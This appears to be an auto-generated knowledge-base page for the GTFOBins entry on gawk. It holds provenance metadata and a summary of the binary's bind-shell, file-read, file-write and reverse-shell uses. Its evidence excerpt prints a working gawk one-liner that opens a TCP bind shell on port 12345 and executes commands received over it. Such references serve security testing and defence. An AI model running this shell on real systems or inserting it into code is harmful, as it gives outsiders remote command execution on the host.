---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# gawk

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `gawk` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gawk` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for gawk covering bind-shell, file-read, file-write, reverse-shell, shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/gawk.md)
- Source verification: [source record](../../sources/gtfobins/gawk.md)

## Aliases

- `gawk`

## Source Verification

[source record](../../sources/gtfobins/gawk.md)

## Evidence Excerpt

```text
_body: ''
_name: gawk
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gawk
functions:
bind-shell:
- code: "gawk 'BEGIN {\n    s = \"/inet/tcp/12345/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0)\
\ break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
connector: tcp-client
```
